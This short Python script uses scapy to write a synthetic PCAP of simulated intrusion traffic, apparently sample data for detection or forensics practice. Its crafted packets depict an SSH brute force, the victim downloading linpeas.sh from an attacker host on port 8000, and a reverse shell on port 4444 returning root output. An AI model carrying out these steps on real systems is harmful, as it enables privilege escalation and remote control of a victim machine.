from scapy.all import IP, TCP, Raw, wrpcap

packets = [
    # 1. Normal Admin SSH
    IP(src="192.168.1.50", dst="192.168.1.10") / TCP(sport=51234, dport=22, flags="SA"),
    # 2. Attacker SSH Brute Force
    IP(src="10.10.14.23", dst="192.168.1.10") / TCP(sport=44101, dport=22, flags="S"),
    IP(src="10.10.14.23", dst="192.168.1.10") / TCP(sport=44102, dport=22, flags="S"),
    IP(src="10.10.14.23", dst="192.168.1.10") / TCP(sport=44115, dport=22, flags="PA"),
    # 3. Downloading linpeas.sh over HTTP port 8000
    IP(src="192.168.1.10", dst="10.10.14.23") / TCP(sport=58112, dport=8000, flags="PA") / Raw(load=b"GET /linpeas.sh HTTP/1.1\r\nHost: 10.10.14.23:8000\r\n\r\n"),
    # 4. Outbound Reverse Shell on Port 4444
    IP(src="192.168.1.10", dst="10.10.14.23") / TCP(sport=39881, dport=4444, flags="PA") / Raw(load=b"uid=0(root) gid=0(root) groups=0(root)\n")
]

wrpcap("sample_logs/attack_traffic.pcap", packets)
print("[+] Real binary PCAP file created at: sample_logs/attack_traffic.pcap")